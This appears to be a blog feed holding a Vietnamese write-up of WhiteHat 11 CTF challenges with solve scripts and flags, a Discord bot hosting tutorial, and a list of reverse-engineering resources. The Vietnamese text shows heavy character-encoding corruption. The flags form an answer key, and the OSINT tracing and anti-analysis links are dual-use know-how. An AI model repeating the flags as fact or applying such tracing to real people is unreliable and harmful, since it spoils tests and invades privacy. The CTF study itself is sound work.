b√†i: A big football team in London \u0026ndash;\u0026gt; ƒê·∫£o ng∆∞·ª£c l·∫°i c·ª•m ·ªü tr√™n ta ƒë∆∞·ª£c flag\nflag: WhiteHat{10nd0n_15_b1u3}\nREVERSE ENGINEERING WhiteHatPlay11v1 Load file v√†o IDA, ƒë·ªÉ √Ω _main\n·ªü ƒë√¢y c√≥ h√†m sub_4010A0, sub_401190 v√† sub_401440 l√† ƒë√°ng ch√∫ √Ω, ki·ªÉm tra t·ª´ng h√†m m·ªôt\nsub_4010A0\nT·ªõi ƒë√¢y th√¨ c√≥ byte_40EFB0 l√† kh√¥ng r√µ r√†ng, t√¨m hi·ªÉu s√¢u v√†o\nƒê·ªÉ √Ω k·ªπ 1 ch√∫t ·ªü ngay b√™n d∆∞·ªõi th√¨ c√≥ xu·∫•t hi·ªán ƒë·∫∑c ƒëi·ªÉm c·ªßa base85\nsub_401190\nTh·∫•y c√≥ byte_410F0C, ki·ªÉm tra th√¨ c√≥\nƒê·∫øn ƒë√¢y l√† ƒë√£ xong, d·ªãch base85 b·∫±ng cyberchef\nflag: Whit3H4t11H4v34N1C3D4yR3VeRs31!\nB√†i n√†y ch·∫Øc l√† v√¨ l√Ω do ch·ªâ c√≥ click\u0026amp;click n√™n s·ªë sao d√†nh t·∫∑ng cho chall ch·ªâ l√† 2/5\nWhiteHatPlay11v2 M·ªü file .dll nh·∫≠n ƒë∆∞·ª£c b·∫±ng IDA\nH√†m WhiteHat()\n1 s·ªë ƒëi·ªÅu c·∫ßn ch√∫ √Ω ·ªü h√†m ƒë·∫∑c bi·ªát n√†y:\nbi·∫øn local:\ncheck bi·∫øn v√†o:\nLABEL_6:\nLABEL_41\nCh·ª©c nƒÉng\nT·∫°i LABEL_6:\nstrncpy_s(Destination, 260u, Str, 36u); v√† v4 = Destination; s·∫Ω hi·ªÉu l√† bi·∫øn v4 = Destination s·∫Ω l·∫•y 36 k√Ω t·ª± ƒë·∫ßu c·ªßa Str\nM·ªôt ph·∫ßn n·ªØa l√† QDIwMjI= base64 l√† @2022 s·∫Ω l√† 5 k√Ω t·ª± cu·ªëi c·ªßa flag\nH√†m check 36 k√Ω t·ª± ƒë·∫ßu c·ªßa input v√† ƒë·ªëi chi·∫øu v·ªõi flag:\nm·∫∑t kh√°c l·∫°i c√≥ c√°c byte t∆∞∆°ng ·ª©ng ƒë·ªÉ ƒë·ªëi chi·∫øu\nTheo m√¨nh hi·ªÉu code s·∫Ω l√† qua h√†m l·∫•y t·ª´ng k√Ω t·ª± c·ªßa input xor v·ªõi\nƒê·ªÉ √Ω call ngay tr∆∞·ªõc 5 byte cu·ªëi s·∫Ω l√† h√†m sub_10001EC0 x·ª≠ l√Ω 36 byte ƒë·∫ßu c·ªßa input\nH√†m n√†y c√≥ c√¥ng d·ª•ng g·ªçi 36 byte ƒë·∫ßu c·ªßa input v√† m·ªói k√Ω t·ª± khi g·ªçi s·∫Ω ƒë∆∞·ª£c xor v·ªõi 0x11 (^ 0x11) v√† sau ƒë√≥ c·ªông v·ªõi 11\nVi·∫øt script:\n1 2 3 4 decode = [0x70, 0x83, 0x84, 0x51, 0x70, 0x30, 0x64, 0x2D, 0x2C, 0x4D, 0x2B, 0x2B, 0x2D, 0x72, 0x2B, 0x68, 0x82, 0x83, 0x68, 0x30, 0x6F, 0x2C, 0x53, 0x7F, 0x88, 0x88, 0x2B, 0x51, 0x7F, 0x87, 0x2D, 0x4E, 0x6E, 0x2D, 0x5E, 0x87] for i in range(0, len(decode)): print(chr((decode[i] - 11) ^ 0x11), end =\u0026#34;\u0026#34;) Nh∆∞ng c√≥ v·∫ª ch∆∞a ·ªïn l·∫Øm v√¨ b·ªã ng∆∞·ª£c (sau 4 byte n√≥ t·ª± ƒë·ªïi)\nWhit3H4t \u0026ndash;\u0026gt; tihWt4H3\nScript gi·∫£i\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 decode = [0x70, 0x83, 0x84, 0x51, 0x70, 0x30, 0x64, 0x2D, 0x2C, 0x4D, 0x2B, 0x2B, 0x2D, 0x72, 0x2B, 0x68, 0x82, 0x83, 0x68, 0x30, 0x6F, 0x2C, 0x53, 0x7F, 0x88, 0x88, 0x2B, 0x51, 0x7F, 0x87, 0x2D, 0x4E, 0x6E, 0x2D, 0x5E, 0x87] x = [] for i in range(0, len(decode)): x += (chr((decode[i] - 11) ^ 0x11)) # d·ªãch c√°c k√Ω t·ª± for i in range(0, len(decode), 4): # ƒë·ªïi ch·ªó c√°c k√Ω t·ª± tmp1 = x[i] x[i] = x[i+3] x[i+3] = tmp1 # ƒê·ªïi th·ª© t·ª± 1, 4 --\u0026gt; 4, 1 tmp2 = x[i+1] x[i+1] = x[i+2] x[i+2] = tmp2 # ƒë·ªïi th·ª© t·ª± 2, 3 --\u0026gt; 3, 2 print(*x, sep = \u0026#34;\u0026#34;) flag: WhiteHat{Whit3H4t11S0L1v34LifeY0uW1llR3memB3r}\nB√†i n√†y m√¨nh th·∫•y kh√° hay nh∆∞ng sao l·∫°i √≠t sao th·∫ø nh·ªâ? (1/5 sao)\nstartr3 V·ªõi b√†i n√†y m·ªü file b·∫±ng ida64 \u0026ndash;\u0026gt; free flag\nflag: WhiteHat{start_r3_ez_game}\n:))) m√† c≈©ng ch·∫≥ng hi·ªÉu sao b√†i n√†y l·∫°i l√† b√†i re3 m√† l·∫°i c√≤n 3 sao\nBaby RE Nh√¨n file t·∫£i v·ªÅ l√† bi·∫øt n√≥ li√™n quan ƒë·∫øn python, l√† 1 ng∆∞·ªùi ch∆°i rev ch·∫Øc h·∫≥n s·∫Ω bi·∫øt ƒë·∫øn pyc (ƒë√£ t·ª´ng ƒë∆∞·ª£c m√¨nh nh·∫Øc ƒë·∫øn trong chall c·ªßa BlueHens)\nSau m·ªôt h·ªìi loay hoay th√¨ m√¨nh t√¨m ƒë∆∞·ª£c tool ƒë·ªÉ decompile file n√†y l√† pyinstxtractor\nSau khi ch·∫°y pyinstxtractor:\nV√† ra file quewridg.pyc, s·ª≠ d·ª•ng Uncompyle6 ho·∫∑c Decompiler Tools\nCode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) # [GCC 7.5.0] # Warning: this version of Python has problems handling the Python 3 \u0026#34;byte\u0026#34; type in constants properly. # Embedded file name: quewridg.py import base64, os, time str1 = [] str2 = [] k = None h = None def re(): global h global k s = \u0026#39;VOhEdHV0YIRVVLF0S9\u0026#39; x = \u0026#39;92Mp5GXI5XV79DMO1F\u0026#39; for i in range(len(s)): if i % 2 != 0: str1.append(s[i]) str2.append(x[i]) else: str1.append(x[i]) str2.append(s[i]) k = \u0026#39;\u0026#39;.join(str1) h = \u0026#39;\u0026#39;.join(str2) def write_1(): with open(os.environ[\u0026#39;USERPROFILE\u0026#39;] + str(base64.b64decode(\u0026#39;XEFwcERhdGFcTG9jYWxcVGVtcFw=\u0026#39;), \u0026#39;utf-8\u0026#39;) + k + str(base64.b64decode(\u0026#39;LnR4dA==\u0026#39;), \u0026#39;utf-8\u0026#39;), \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;YmFuIGNvIHRoYXkgY29uIGJhY2ggdHVvYyBrZXUga2hvbmc=\u0026#39;) with open(os.environ[\u0026#39;USERPROFILE\u0026#39;] + str(base64.b64decode(\u0026#39;XEFwcERhdGFcUm9hbWluZ1w=\u0026#39;), \u0026#39;utf-8\u0026#39;) + h + str(base64.b64decode(\u0026#39;LnR4dA==\u0026#39;), \u0026#39;utf-8\u0026#39;), \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;dGltIHRodSB4ZW0=\u0026#39;) def content(): banner = \u0026#34;.__ __. __ ______ ___ .___________.____ _ _ .___ ___. \\n| \\\\ | | /_ | / | / _ \\\\ | |___ \\\\ | || | | \\\\/ | \\n| \\\\| | | | | ,----\u0026#39;| | | | `---| |----` __) | | || |_ | \\\\ / | \\n| . ` | | | | | | | | | | | |__ \u0026lt; |__ _| | |\\\\/| | \\n| |\\\\ | | | | `----.| |_| | | | ___) | | | | | | | \\n|__| \\\\__| |_| \\\\______| \\\\___/ |__| |____/ |_| |__| |__|\u0026#34; print(banner) print(\u0026#39;=======================================================================================\u0026#39;) print(\u0026#39; https://www.youtube.com/shorts/t1u-h4rlNSY \u0026#39;) print(\u0026#39;=======================================================================================\u0026#39;) time.sleep(5) if __name__ == \u0026#39;__main__\u0026#39;: content() re() write_1() ƒê·ªçc code th√¨ c√≥ th·ªÉ th·∫•y ·ªü h√†m write_1() ch·ªâ l√† s·ª≠ d·ª•ng base64 ƒë·ªÉ ƒë√°nh l·ª´a, khi bi√™n d·ªãch ra th·ª±c ch·∫•t ch·ªâ l√† t·∫°o file v√† ƒëi·ªÅn v√†o ƒë√≥ v√†i c·ª•m t·ª´ v√¥ nghƒ©a v·ªõi m·ª•c ƒë√≠ch ch√∫ng ta c·∫ßn, h√†m content()\nV·∫≠y ·ªü ƒë√¢y ch·∫Øc ch·ªâ d√πng ƒë∆∞·ª£c h√†m re()\nta th·∫•y h v√† k ƒë√£ ƒë∆∞·ª£c tr·∫£i qua nhi·ªÅu l·ªánh nh∆∞ng l·∫°i kh√¥ng ƒë·ªÉ l√†m g√¨ n√™n s·∫Ω in ra xem n√≥ s·∫Ω l√†m g√¨\nKhi in ra th√¨ h = V2hpdGVIYXR7VDFOSF v√† k = 9OME5HX05IVV9LM019\nD·ªãch th·ª≠ base64\nflag: WhiteHat{T1NH_N0NG_NHU_K3M}\nC√≥ l·∫Ω t√°c gi·∫£ ra ƒë·∫øn ƒë√¢y b√≠ √Ω t∆∞·ªüng :)) ch·ª© kh√¥ng th·ªÉ x√†m nh∆∞ n√†y ƒë∆∞·ª£c\nflagcheck Check main:\nQua check h√†m main th√¨ d·ªÖ th·∫•y h√†m n√†y ƒë∆°n gi·∫£n l√† cho 1 d√£y k√Ω t·ª± ƒë·∫ßu v√†o, sau ƒë√≥ ch√∫ng ta ph·∫£i nh·∫≠p flag v√† h√†m n√†y s·∫Ω check t·ª´ng k√Ω t·ª± r·ªìi xor v·ªõi s·ªë th·ª© t·ª± c·ªßa ch√∫ng (ƒë√£ c·ªông th√™m 1)\nV√† sau ƒë√≥ so s√°nh b·ªô k√Ω t·ª± m·ªõi ƒë∆∞·ª£c in ra v√† b·ªô k√Ω t·ª± ban ƒë·∫ßu cho, v·∫≠y n√™n ƒë·∫øn ƒë√¢y c√≥ th·ªÉ vi·∫øt script ƒë·ªÉ c√≥ ƒë∆∞·ª£c flag\ncode:\n1 2 3 encode_flag = \u0026#34;Vjjp`Nf|roqSua}Ow}aKg%H{q{wpxpxE~mLTX\u0026#34; for i in range(len(encode_flag)): print(chr(ord(encode_flag[i]) ^ (i + 1)), end =\u0026#34;\u0026#34;) flag: WhiteHat{ez_xor_for_r3_challenge_Oop}\nCRYPTOGRAPHY b64\u0026amp;xor ƒê·ªÅ b√†i cho 1 ƒëo·∫°n base64 d·ªãch sang th√¨ th√†nh 1 ƒëo·∫°n kh√¥ng h·ªÅ c√≥ nghƒ©a g√¨ l·∫Øm\nM√† ƒë·ªÅ b√†i l·∫°i l√† xor\u0026amp;b64 nh∆∞ng l·∫°i ch·∫≥ng cho th·ª© c·∫ßn xor l√† g√¨ n√™n m√¨nh nghƒ© s·∫Ω check th·ª≠ v·ªõi format c·ªßa ƒë·ªÅ b√†i: WhiteHat{\nv√† sau v√†i l·∫ßn th·ª≠ th√¨ m√¨nh ƒë√£ th√†nh c√¥ng b·∫±ng vi·ªác chuy·ªÉn ƒëo·∫°n cipher ban ƒë·∫ßu t·ª´ base64 decode ra v·ªÅ byte r·ªìi xor v·ªõi c√°c byte c·ªßa format ƒë·ªÅ\n1 2 3 4 5 6 7 8 9 10 11 import base64 if __name__ == \u0026#34;__main__\u0026#34;: coded_string = \u0026#34;NFwcKxN4DxMGLVxFABUAADgQFgAqMgNRMQ89PAAbNyldXg4iF1xBJik=\u0026#34; format_flag = \u0026#34;WhiteHat{\u0026#34; flag = [] y = bytes(format_flag, \u0026#39;utf-8\u0026#39;) x = base64.b64decode(coded_string) for i in range(0,9): j = 0 print((chr(x[i] ^ y[i])), end =\u0026#34;\u0026#34;) ƒêo·∫°n n√†y ra t∆∞∆°ng ·ª©ng v·ªõi c4u_v0ng}, m√¨nh th·ª≠ th√™m nhi·ªÅu WhiteHat{ n·ªØa v√†o format flag v√† n√≥ tr·∫£ v·ªÅ nh∆∞ n√†y\nKh√¥ng c√≥ √Ω nghƒ©a g√¨ l·∫Øm n√™n tr·ªü l·∫°i th√¨ m√¨nh ch·ª£t nghƒ© ra, n·∫øu xor t·ª´ WhiteHat{ th√†nh ƒë∆∞·ª£c c4u_v0ng} v·∫≠y th√¨ t·ª´ c4u_v0ng} c≈©ng v·ªÅ ƒë∆∞·ª£c WhiteHat{ v√† m·ª•c ti√™u b√¢y gi·ªù ch·ªâ c·∫ßn ki·∫øm c√°i ƒëo·∫°n ƒë·∫±ng sau c√°i WhiteHat{ ƒë√≥ b·∫±ng c√°ch m√¨nh th√™m r·∫•t nhi·ªÅu c·ª•m c4u_v0ng} v√†o format_flag\n1 2 3 4 5 6 7 8 9 10 11 import base64 if __name__ == \u0026#34;__main__\u0026#34;: coded_string = \u0026#34;NFwcKxN4DxMGLVxFABUAADgQFgAqMgNRMQ89PAAbNyldXg4iF1xBJik=\u0026#34; format_flag = \u0026#34;c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}\u0026#34; flag = [] y = bytes(format_flag, \u0026#39;utf-8\u0026#39;) x = base64.b64decode(coded_string) for i in range(0,41): j = 0 print((chr(x[i] ^ y[i])), end =\u0026#34;\u0026#34;) flag: WhiteHat{Nh0_c0n_mu4_mua_h@_4nh_m0i_th4y_c4u_v0ng}\nProgrammer 1 2 3 4 5 6 7 8 9 10 11 12 13 from secret import flag def cal_flag(flag): output=[] for i in range(len(flag)): temp = ord(flag[i])**17%3233 output.append(temp) print(output) if __name__ == \u0026#39;__main__\u0026#39;: cal_flag(flag) #[604, 2170, 3179, 884, 1313, 3000, 1632, 884, 855, 3179, 119, 1632, 2271, 119, 612, 2412, 2185, 2923, 2412, 1632, 2271, 2271, 1313, 2412, 119, 3179, 119, 2170, 1632, 2578, 1313, 119, 2235, 2185, 119, 745, 3179, 1369, 1313, 1516] ƒê·ªçc k·ªπ ƒë·ªÅ c√≥ th·ªÉ th·∫•y t·ª´ vi·ªác ta c√≥ 1 flag cho s·∫µn c·ªßa ƒë·ªÅ ‚Äì\u0026gt; ta s·∫Ω bi·∫øn ƒë·ªïi t·ª´ng ph·∫ßn t·ª≠ flag qua h√†m cal_flag b·∫±ng c√°ch v·ªõi m·ªói k√Ω t·ª± c·ªßa flag v√†o s·∫Ω ƒë∆∞·ª£c m≈© 17 l√™n v√† l·∫•y ph·∫ßn d∆∞ v·ªõi 3233\nTa ti·∫øn h√†nh vi·∫øt l·∫°i code ƒë·ªÉ chuy·ªÉn ƒë·ªïi t·ª´ng s·ªë trong output tr·ªü l·∫°i th√†nh flag\nDo m√¨nh c≈©ng kh√¥ng bi·∫øt c√≥ c√°ch n√†o hay h∆°n n√™n m√¨nh ch·ªâ ƒë∆°n gi·∫£n l√† bruteforce c√°i encode ƒë√≥ v·ªÅ l·∫°i th√†nh flag v·ªõi c·∫•u tr√∫c l·ªánh duy nh·∫•t l√† **17%3233 (v·ªõi m·ªói k√Ω t·ª± thu·ªôc kho·∫£ng (0, 127) s·∫Ω cho qua l·ªánh ƒë·ªÉ xem n√≥ c√≥ ph·∫£i l√† k√Ω t·ª± c·ªßa encode t∆∞∆°ng ·ª©ng kh√¥ng)\ncode:\n1 2 3 4 5 6 7 encode = [604, 2170, 3179, 884, 1313, 3000, 1632, 884, 855, 3179, 119, 1632, 2271, 119, 612, 2412, 2185, 2923, 2412, 1632, 2271, 2271, 1313, 2412, 119, 3179, 119, 2170, 1632, 2578, 1313, 119, 2235, 2185, 119, 745, 3179, 1369, 1313, 1516] for i in encode: for x in range(0, 127): if ((x**17 % 3233) == i): print(chr(x), end=\u0026#34;\u0026#34;) flag: WhiteHat{i_am_programmer_i_have_no_life}\nDIGITAL FORENSICS Corrupt ƒê·∫ßu ti√™n ch√∫ng ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c 1 file .png m·ªü l√™n th√¨ th·∫•y kh√¥ng ƒë∆∞·ª£c :3\nki·ªÉm tra hex c·ªßa n√≥ th√¨ c≈©ng th·∫•y l·∫° v√¨ kh√¥ng tr√πng v·ªõi magic bytes ph·ªï bi·∫øn n√†o (c√°c hex ƒë·∫ßu)\nV√† ph√≠a sau ƒëo·∫°n hex ƒë√≥ l·∫°i c√≥ 1 s·ªë ƒëo·∫°n strings quen thu·ªôc nh∆∞ .png, IHDR, IDAT n√™n m√¨nh nghƒ© t√°c gi·∫£ c·ªë t√¨nh ch√®n 1 v√†i ƒëo·∫°n strings l·∫° v√†o ƒë·ªÉ ƒë√°nh l·ª´a v√† th·ª±c ra file n√†y ban ƒë·∫ßu l√† 1 ·∫£nh PNG th·∫≠t, vi·ªác c·ªßa ch√∫ng ta b√¢y gi·ªù ch·ªâ c·∫ßn s·ª≠a l·∫°i c√°c hex ƒë·ªÉ ƒë∆∞a ra ·∫£nh ƒë√∫ng\n·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng bless ƒë·ªÉ thay ƒë·ªïi c√°c hex trong file ·∫£nh PNG n√†y\n·ªû ƒë√¢y c√≥ l·∫Ω m√¨nh s·∫Ω xo√° h·∫øt c√°c hex kh√¥ng li√™n quan ƒëo·∫°n ƒë·∫±ng tr∆∞·ªõc .png v√† sau ƒë√≥ ƒë·ªïi .png th√†nh .PNG b·∫±ng c√°ch chuy·ªÉn b·ªô s·ªë hex t·ª´ 89 70 6E 67 th√†nh 89 50 4e 47 t∆∞∆°ng ·ª©ng .png \u0026ndash;\u0026gt; .PNG\nCheck th·∫•y IHDR v√† IDAT ƒë√£ ƒë√∫ng\nV√¨ ti√™u ƒë·ªÅ PNG c√≥ End Of Line c·ª• th·ªÉ ƒë∆∞·ª£c nh·∫≠n d·∫°ng tr√™n Linux. Ti√™u ƒë·ªÅ PNG ban ƒë·∫ßu c·ªßa file Corrupt l√† 89 50 4E 47 0D 1A 0A 1A v√† m√¨nh s·∫Ω s·ª≠a th√†nh 89 50 4E 47 0D 0A 1A 0A\nGi·∫£i th√≠ch:\n89 c√≥ bit cao ƒë∆∞·ª£c ƒë·∫∑t ƒë·ªÉ ph√°t hi·ªán c√°c h·ªá th·ªëng truy·ªÅn d·∫´n kh√¥ng h·ªó tr·ª£ d·ªØ li·ªáu 8 bit v√† ƒë·ªÉ gi·∫£m kh·∫£ nƒÉng t·ªáp vƒÉn b·∫£n b·ªã hi·ªÉu nh·∫ßm l√† PNG ho·∫∑c ng∆∞·ª£c l·∫°i. 50 4E 47 Trong ASCII, c√°c ch·ªØ c√°i PNG, cho ph√©p m·ªôt ng∆∞·ªùi d·ªÖ d√†ng x√°c ƒë·ªãnh ƒë·ªãnh d·∫°ng n·∫øu n√≥ ƒë∆∞·ª£c xem trong tr√¨nh so·∫°n th·∫£o vƒÉn b·∫£n. 0D 0A\tM·ªôt d√≤ng ki·ªÉu DOS k·∫øt th√∫c ( CRLF ) ƒë·ªÉ ph√°t hi·ªán chuy·ªÉn ƒë·ªïi k·∫øt th√∫c d√≤ng DOS-Unix c·ªßa d·ªØ li·ªáu. 1A M·ªôt byte d·ª´ng hi·ªÉn th·ªã t·ªáp trong DOS khi lo·∫°i l·ªánh ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng ‚Äî k√Ω t·ª± cu·ªëi t·ªáp. 0A M·ªôt d√≤ng ki·ªÉu Unix k·∫øt th√∫c ( LF ) ƒë·ªÉ ph√°t hi·ªán chuy·ªÉn ƒë·ªïi k·∫øt th√∫c d√≤ng Unix-DOS. L∆∞u l·∫°i v√† ch√∫ng ta s·∫Ω th·∫•y s·ª± kh√°c bi·ªát, b√¨nh th∆∞·ªùng sau b∆∞·ªõc n√†y m√¨nh s·∫Ω check th√™m b·∫±ng pngcheck ƒë·ªÉ xem c√≥ l·ªói th√™m g√¨ kh√¥ng v√† ·ªü ƒë√¢y may m·∫Øn l√† kh√¥ng l·ªói\n\u0026ndash;\u0026gt; c√≥ ·∫£nh ban ƒë·∫ßu:\nTry hard v·∫Ω l·∫°i b·∫±ng pixel c√°i QR: th√¨ ·ªü c√°c ph·∫ßn b·ªã thi·∫øu s·∫Ω b·ªï sung ƒë∆∞·ª£c v√†i th·ª© quan tr·ªçng\nGi·∫£i th√≠ch: Do sau khi nh·∫≠p c√°c ph·∫ßn vi·ªÅn c·ªßa c√°c ph·∫ßn √¥ vu√¥ng, th√¨ n√≥ t·ª± nh·∫≠n di·ªán v√† fill n·ªët c√°i vi·ªÅn c√≤n l·∫°i\nQu√©t c√°i QR b√™n tr√™n th√¨ ra flag\nflag: WhiteHat{4a5y_W4rmup_ch4lleng3_f0r_SUMMER_RACEEE}\nOSINT Summer vacation: Flight Flight Flight Incent Eva went to Hanoi with her friend. I am very curious about her friend and flight information. Help me. Flag fomat: WhiteHat{NAME_FLIGHT_SEAT_DATE} osint02 can be solved before osint01.\nƒê·ªÅ b√†i c√≥ nh·∫Øc t·ªõi 1 nh√¢n v·∫≠t Incent Eva ‚Äì\u0026gt; nghƒ© t·ªõi vi·ªác s·ª≠ d·ª•ng 1 v√†i c√¥ng c·ª• osint ƒë·ªÉ t√¨m ra c√°c t√†i kho·∫£n m·∫°ng x√£ h·ªôi c·ªßa ng∆∞·ªùi n√†y.\nSau khi th·ª≠, ƒë√£ t√¨m ƒë∆∞·ª£c t√†i kho·∫£n twitter c√≥ username: @incent_eva\nChuy·ªÉn sang m·ª•c Likes, ta th·∫•y c√≥ 1 t√†i kho·∫£n kh√°c xu·∫•t hi·ªán ‚Äì\u0026gt; @vy_tran_11\nCheck th·ª≠ link trong trang c√° nh√¢n c·ªßa ng∆∞·ªùi kia, v√† sau khi check ·∫£nh trong page ng∆∞·ªùi ƒë√≥, ta ƒë∆∞·ª£c:\nflag: WhiteHat{VYTRAN_VJ375_3F_30MAR}\nAdultery I A client hired me as a private investigator to track down her husband, Cuming Brian, because she suspected him of having an affair. Check out his social media accounts to see if there\u0026rsquo;s anything interesting\nƒê·ªÅ b√†i c√≥ nh·∫Øc ƒë·∫øn 1 nh√¢n v·∫≠t l√† Cuming Brian, th√¨ theo th√≥i quen ch√∫ng ta c·ª© t√¨m ki·∫øm tr√™n instagram ho·∫∑c twitter thanh ni√™n n√†y th√¨ c√≥ k·∫øt qu·∫£\nflag: WhiteHat{N3xt_p4rt_1S_h@rd3r_g0_9o_bruh}\n","date":"2022-07-01T00:00:00Z","image":"/p/wargame-whitehat-11-writeups/featured_hube26ae2df264f2ab1d9a8765d78c4ec7_187143_120x120_fill_box_smart1_3.png","permalink":"/p/wargame-whitehat-11-writeups/","title":"Wargame Whitehat 11 | Writeups"},{"content":"Create Bot Discord \u0026amp; basic config Use DEVELOPER PORTAL to create Bot We can use DEVELOPER PORTAL during the process of creating and using the Bot\nSelect New Application to create a completely new Discord Bot\nAfter successfully creating the Bot, the next step is to configure the Bot to run normally\nToken Bot Instructions: Bot -\u0026gt; Reset Token In addition to basic operations such as changing the name of the Bot, changing the avatar of the Bot,\u0026hellip; there is also a notable item is Token (click on Reset Token to display Token for first use)\nCode base for Discord Bot Main code The main python code will look like this (basic for the Bot to work properly)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import discord from discord.ext import commands Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Name this code main.py for the system that uses it\nNote: YOUR_TOKEN is the Token you just received above\nKeep Alive In order for the Bot to work and check that it works, you need to ping it so that the Bot server can run normally\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from threading import Thread app = Flask(\u0026#39;\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#34;ping me every time!!!\u0026#34; def run(): app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) def keep_alive(): t = Thread(target=run) t.start() Name the code keep_alive.py along with the directory containing main.py\nAfter you have wrote the keep_alive.py code, you need to integrate it with main.py so that when you run main.py it will also run.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import discord from discord.ext import commands from keep_alive import keep_alive keep_alive() Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Host Bot on Replit Let\u0026rsquo;s talk a little bit about Replit, this is a very good online IDE that supports many programming languages ‚Äã‚Äã(I often use python here for the purpose of being able to install libs). specific to CTF without error). So if you can host a Bot on your computer, you can also host it on Replit\nHosting Bot is extremely easy by just putting the last 2 python files onto Replit and running it\nAfter Run on Replit, you can run the Bot normally, but there is a disadvantage of Replit: after 5 minutes, if no user accesses and uses it, it will automatically shut down, that\u0026rsquo;s why we Need more tools to be able to ping Bot continuously\nKeep Bot \u0026ldquo;awake\u0026rdquo; with Uptime RoBot Uptime RoBot through the keep_alive.py file set up above helps check if the Bot is active and will ping it to replit to revive it so that it can be revived. Hang Bot 24/7 without fear of death.\nExample with uptime statistics of my old Bot (Since 2710 hrs, 23 mins (2023-06-09 17:46:19))\nTutorial: Select + Monitor to create a new Monitor In Monitor Information \u0026ndash;\u0026gt; Monitor Type select HTTP(s) Name and add the URL of Project Replit (it will look like https://.repl.co) Set Monitoring Interval to every 5 minutes (in accordance with Replit) Select Create Monitor and the setup is complete Uptime RoBot will now have the task of pinging the Bot every 5 minutes, which is a lot of fun (unless you force it to do too much work with a free tool :3)\nConclusion This article was posted because my Bot was reported, forcing me to re-create a new Bot, so I\u0026rsquo;ll have to read it again later\nRemember to always respect Discord\u0026rsquo;s Terms of Service when running a bot so you don\u0026rsquo;t get banned like me\n","date":"2022-01-30T00:00:00Z","image":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/featured_hud00ea637fa08c187ca2cd6f368360648_31275_120x120_fill_box_smart1_3.png","permalink":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/","title":"Build Bot Discord 24/7 with Replit and Uptime RoBot (Python)"},{"content":"Thanks to Mr. Rc (HACKE-RC) for sharing knowledge about Reverse Engineering!\nReverse Engineering Resources Highest quality resources to learn Reverse Engineering from start to end! Roadmap\nAssembly Linux specific https://asmtutor.com https://www.plantation-productions.com/Webster/www.artofasm.com/Linux/index.html Windows specific https://www.plantation-productions.com/Webster/www.artofasm.com/Windows/index.html https://sonictk.github.io/asm_tutorial/ Miscellaneous Learn how CPUs work https://www.felixcloutier.com/x86/index.html https://cs.lmu.edu/~ray/notes/x86assembly/ https://godbolt.org https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about Assembly Projects After learning assembly, you can try some projects like making a bootloader or a whole simple Operating System. I have wrote a blog on this topic, here.\nhttp://brokenthorn.com/Resources/OSDev1.html https://raw.githubusercontent.com/tuhdo/os01/master/Operating_Systems_From_0_to_1.pdf https://cs.bham.ac.uk/~exr/lectures/opsys/10_11/lectures/os-dev.pdf Operating System Internals https://www.youtube.com/playlist?list=PLmbPuZ0NsyGS8ef6zaHd2qYylzsHxL63x https://www.youtube.com/playlist?list=PLgre7dUq8DGKbtnlMuJPvPYlvLdXOC9uh https://pages.cs.wisc.edu/~remzi/OSTEP/ Getting started Roadmap for RE COMPSCI 390R - Reverse Engineering \u0026amp; Vulnerability Analysis https://www.begin.re https://artik.blue/reversing https://legend.octopuslabs.io/sample-page.html https://www.youtube.com/watch?v=mDyQBM-_T1g https://www.youtube.com/watch?v=gPsYkV7-yJk https://www.youtube.com/watch?v=d4Pgi5XML8E https://www.youtube.com/watch?v=9vKG8-TnawY (Recommended) Getting your hands dirty https://crackmes.one http://reversing.kr/challenge.php https://github.com/Maijin/radare2-workshop-2015/tree/master/IOLI-crackme http://reversing.kr/challenge.php https://0x00sec.org/t/challenge-collection-reverse-engineering-and-crackme/3027 Youtube playlist on Malware Analysis Binary Analysis Free Course Deobfuscation https://www.vadesecure.com/en/blog/malware-analysis-understanding-code-obfuscation-techniques https://www.youtube.com/watch?v=bEsQ8UYioU4 https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847 https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf https://www.varonis.com/blog/x64dbg-unpack-malware https://apr4h.github.io/2021-05-01-Manually-Unpacking-Remcos-Malware/ https://www.youtube.com/watch?v=EdchPEHnohw https://www.youtube.com/playlist?list=PLynb9SXC4yER8NinXJwV4GHUM9-jaIsN_ Anti-debug and Anti-analysis https://iopscience.iop.org/article/10.1088/1742-6596/1744/4/042186/pdf https://wikileaks.org/vault7/document/2015-07-PoC-Anti_Debugging_and_Anti_Emulation/2015-07-PoC-Anti_Debugging_and_Anti_Emulation.pdf 